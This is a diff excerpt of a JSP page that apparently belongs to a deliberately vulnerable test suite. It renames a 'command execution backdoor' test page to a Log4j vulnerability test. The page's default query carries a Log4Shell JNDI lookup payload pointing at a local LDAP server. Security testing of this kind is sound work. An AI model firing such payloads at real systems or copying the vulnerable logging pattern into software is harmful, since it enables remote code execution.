@@ -4,10 +4,10 @@
 <html>
 <head>
     <meta charset="UTF-8"/>
-    <title>004 - 命令执行后门（无回显，无拼接）</title>
+    <title>022 - Log4j漏洞测试</title>
 </head>
 <body>
-<h1>004 - 命令执行后门（无回显，无拼接）</h1>
+<h1>022 - Log4j漏洞测试</h1>
 <%
 	String defaultQuery = "?log=${jndi:ldap://127.0.0.1:1389/a}";
 	Logger logger = LogManager.getLogger(this.getClass());
